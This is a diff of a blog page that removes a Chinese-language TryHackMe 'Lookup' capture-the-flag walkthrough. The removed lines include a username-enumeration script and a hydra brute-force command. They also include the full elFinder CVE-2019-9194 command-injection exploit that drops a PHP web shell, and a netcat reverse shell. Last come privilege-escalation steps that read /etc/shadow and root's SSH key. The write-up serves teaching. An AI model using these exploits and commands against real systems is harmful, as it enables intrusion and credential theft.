@@ -200,148 +200,6 @@
             
             <p>首先需要改在hosts里面加一个：10.10.46.174   lookup.thm   以防止重定向。</p>
 <p>仔细观察两个抓包页面：</p>
-<p><img src="/../lookup/1.png" alt="1"></p>
-<p><img src="/../lookup/2.png" alt="2"></p>
-<p>一个返回Wrong username or password一个返回 Wrong password，所以断定存在一个admin账户。</p>
-<pre><code class="language-python">import requests
-wordlist = &quot;/usr/share/seclists/Usernames/Names/names.txt&quot;
-
-
-with open(wordlist, &#39;r&#39;) as f:
-    for line in f:
-        username = line.strip()
-        if not username:
-            continue
-
-        data = &#123;&quot;username&quot;: username,
-                &quot;password&quot;: &quot;testpassword&quot;&#125;
-        response = requests.post(url=&quot;http://lookup.thm/login.php&quot;, data=data)
-
-        if &quot;Wrong password&quot; in response.text:
-            print(f&quot;\r[*] Found a username! \&quot;&#123;username&#125;\&quot;&quot;)
-
-
-print()
-</code></pre>
-<p><img src="/../lookup/3.png" alt="3"></p>
-<p>发现存在一个jose</p>
-<pre><code class="language-cmd">hydra -l jose -P 10-million-password.txt lookup.thm http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong&quot; -V
-</code></pre>
-<p>这个爆破有点慢，可以直接用yakit来进行爆破，最后得到账号密码：最后成功进入后台</p>
-<pre><code>jose
-password123
-</code></pre>
-<p><img src="/../lookup/4.png" alt="4"></p>
-<p>然后根据<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46481">https://www.exploit-db.com/exploits/46481</a></p>
-<pre><code class="language-python">#!/usr/bin/python
-
-&quot;&quot;&quot;
-# Exploit Title: elFinder &lt;= 2.1.47 - Command Injection vulnerability in the PHP connector.
-# Date: 26/02/2019
-# Exploit Author: @q3rv0
-# Vulnerability reported by: Thomas Chauchefoin
-# Google Dork: intitle:&quot;elFinder 2.1.x&quot;
-# Vendor Homepage: https://studio-42.github.io/elFinder/
-# Software Link: https://github.com/Studio-42/elFinder/archive/2.1.47.tar.gz
-# Version: &lt;= 2.1.47
-# Tested on: Linux 64bit + Python2.7
-# PoC: https://www.portal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/
-# CVE: CVE-2019-9194
-
-# Usage: python exploit.py [URL]
-&quot;&quot;&quot;
-
-import requests
-import json
-import sys
-
-# 确保同级目录下存在一个jpg文件
-payload = &quot;test.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p &gt; hack.php;echo test.jpg&quot;
-
-
-def usage():
-    if len(sys.argv) != 2:
-        print(&quot;Usage: python exploit.py [URL]&quot;)
-        sys.exit(0)
-
-
-def upload(url, payload):
-    files = &#123;&quot;upload[]&quot;: (payload, open(&quot;test.jpg&quot;, &quot;rb&quot;))&#125;
-    data = &#123;
-        &quot;reqid&quot;: &quot;1693222c439f4&quot;,
-        &quot;cmd&quot;: &quot;upload&quot;,
-        &quot;target&quot;: &quot;l1_Lw&quot;,
-        &quot;mtime[]&quot;: &quot;1497726174&quot;,
-    &#125;
-
-    r = requests.post(&quot;%s/php/connector.minimal.php&quot; % url, files=files, data=data)
-    j = json.loads(r.text)
-    return j[&quot;added&quot;][0][&quot;hash&quot;]
-
-
-def imgRotate(url, hash):
-    r = requests.get(
-        &quot;%s/php/connector.minimal.php?target=%s&amp;width=539&amp;height=960&amp;degree=180&amp;quality=100&amp;bg=&amp;mode=rotate&amp;cmd=resize&amp;reqid=169323550af10c&quot;
-        % (url, hash)
-    )
-    return r.text
-
-
-def shell(url):
-    r = requests.get(&quot;%s/php/hack.php&quot; % url)
-    if r.status_code == 200:
-        print(&quot;[+] Pwned! :)&quot;)
-        print(&quot;[+] Getting the shell...&quot;)
-        while 1:
-            try:
-                inputs = input(&quot;$ &quot;)
-                r = requests.get(&quot;%s/php/hack.php?c=%s&quot; % (url, inputs))
-                print(r.text)
-            except KeyboardInterrupt:
-                sys.exit(&quot;\nBye kaker!&quot;)
-    else:
-        print(&quot;[*] The site seems not to be vulnerable :(&quot;)
-
-
-def main():
-    usage()
-    url = sys.argv[1]
-    print(&quot;[*] Uploading the malicious image...&quot;)
-    hash = upload(url, payload)
-    print(&quot;[*] Running the payload...&quot;)
-    imgRotate(url, hash)
-    shell(url)
-
-
-if __name__ == &quot;__main__&quot;:
-    main()
-</code></pre>
-<p>成功拿到shell：</p>
-<p><img src="/../lookup/5.png" alt="5"></p>
-<p>现在我们创建一个有效载荷来建立一个交互式 shell。为此，我们使用 revshell.com。我们选择<code>nc mkfifo</code>一个并对有效载荷进行 URL 编码，因为我们有一个 web shell</p>
-<p><img src="/../lookup/6.png" alt="6"></p>
-<pre><code>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.17.33.100%208888%20%3E%2Ftmp%2Ff
-</code></pre>
-<p><img src="/../lookup/9.png" alt="9"></p>
-<p>查找具有suid权限的二进制文：find &#x2F; -perm &#x2F;4000 2&gt;&#x2F;dev&#x2F;null | xargs ls -l</p>
-<p>发现了一个可疑的文件：-rwsr-sr-x 1 root   root             17176 Jan 11  2024 &#x2F;usr&#x2F;sbin&#x2F;pwm</p>
-<p>ssh进行远程连接，拿到第一个flag，然后sudo -l  查看当前用户在系统上可以使用sudo执行的命令。</p>
-<pre><code>think
-josemario.AKA(think)
-</code></pre>
-<p><img src="/../lookup/10.png" alt="10"></p>
-<p><img src="/../lookup/11.png" alt="11"></p>
-<p>发现有个look直接去：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>   搜索，它有个读文件的用法：</p>
-<p><img src="/../lookup/12.png" alt="12"></p>
-<p>look ‘’ &#x2F;etc&#x2F;shadow</p>
-<p><img src="/../lookup/13.png" alt="13"></p>
-<p>发现成功，接下来读取root用户的ssh私钥：</p>
-<p>sudo look ‘’ &#x2F;root&#x2F;.ssh&#x2F;id_rsa</p>
-<p><img src="/../lookup/14.png" alt="14"></p>
-<p>最后将得到的ssh连接的密钥保存到一个id_rsa文件中（记得是全部内容），然后赋予这个文件600权限</p>
-<p>chmod 600 id_rsa						最后成功连上去拿到root权限</p>
-<p><img src="/../lookup/15.png" alt="15"></p>
-
             
         </div>
     </div>
@@ -355,7 +213,7 @@ josemario.AKA(think)
         
         <span class="tag">
             
-            <a href="/tags/THM/" style="color: #03a9f4">THM</a>
+            <a href="/tags/THM/" style="color: #00a596">THM</a>
         </span>
         
     </div>
@@ -394,7 +252,7 @@ josemario.AKA(think)
         
         <span class="tag">
             
-            <a href="/tags/THM/" style="color: #ffa2c4">THM</a>
+            <a href="/tags/THM/" style="color: #00a596">THM</a>
         </span>
         
     </div>
@@ -433,7 +291,7 @@ josemario.AKA(think)
         
         <span class="tag">
             
-            <a href="/tags/THM/" style="color: #00a596">THM</a>
+            <a href="/tags/THM/" style="color: #00bcd4">THM</a>
         </span>
         
     </div>
@@ -473,7 +331,7 @@ josemario.AKA(think)
         
         <span class="tag">
             
-            <a href="/tags/THM/" style="color: #ffa2c4">THM</a>
+            <a href="/tags/THM/" style="color: #ff7d73">THM</a>
         </span>
         
     </div>
@@ -512,7 +370,7 @@ josemario.AKA(think)
         
         <span class="tag">
             
-            <a href="/tags/THM/" style="color: #00bcd4">THM</a>
+            <a href="/tags/THM/" style="color: #03a9f4">THM</a>
         </span>
         
     </div>
